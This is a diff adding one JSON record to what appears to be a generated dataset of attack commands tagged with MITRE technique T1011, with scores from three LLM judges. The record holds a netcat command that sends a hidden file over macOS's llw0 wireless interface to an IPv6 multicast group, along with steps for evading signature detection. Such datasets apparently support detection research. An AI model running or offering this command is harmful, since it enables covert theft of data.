@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr llw0)\" \"ff02::1%llw0\" 54901 < /tmp/.z",
+  "explanation": "Uses the low-latency Wi‑Fi interface (llw0) to transmit to the all-nodes IPv6 multicast group on a high, uncommon UDP port, exploiting a secondary wireless medium per T1011.",
+  "rationale_steps": [
+    "Query ipconfig for the IPv6 address on llw0 to ensure traffic egresses over the low-latency Wi‑Fi medium.",
+    "Bind the sender to that address and target a link-local multicast scope.",
+    "Transmit data over an uncommon UDP port to minimize signature-based detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-63e108fb",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with valid BSD nc flags, balanced quoting, proper destination/port, and correct input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates via the llw0 wireless medium using IPv6 UDP multicast per T1011, though dependence on llw0 being active and potential link-local scoping quirks for -s introduce minor realism gaps.",
+        "combined_score": 4.5,
+        "confidence": 0.77,
+        "timestamp": "2025-09-30T23:54:19.784447Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed with balanced quotes and parentheses, valid flags (-6, -u, -s), and proper command substitution, though `ipconfig getv6ifaddr` is a macOS-specific subcommand that may not always return a valid address, making it edge-case fragile.",
+        "semantic_score": 3,
+        "semantic_justification": "The command plausibly attempts exfiltration over a secondary wireless medium (llw0, Apple's low-latency Wi-Fi interface) using IPv6 multicast to ff02::1 on an uncommon UDP port, which aligns with T1011's concept of using an alternate network medium; however, llw0 is typically used for Apple Wireless Direct Link (AWDL) peer-to-peer communication rather than general Wi-Fi exfiltration, and multicast to all-nodes may not reliably reach an attacker-controlled receiver, reducing operational plausibility.",
+        "combined_score": 3.5,
+        "confidence": 0.72,
+        "timestamp": "2026-02-18T21:52:38.454280Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formed for a macOS Bash environment, utilizing correct subshell expansion, valid netcat flags, and proper redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command realistically exploits the macOS-specific AWDL (llw0) interface to transmit data over a secondary wireless medium, perfectly aligning with the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T21:52:45.011728Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
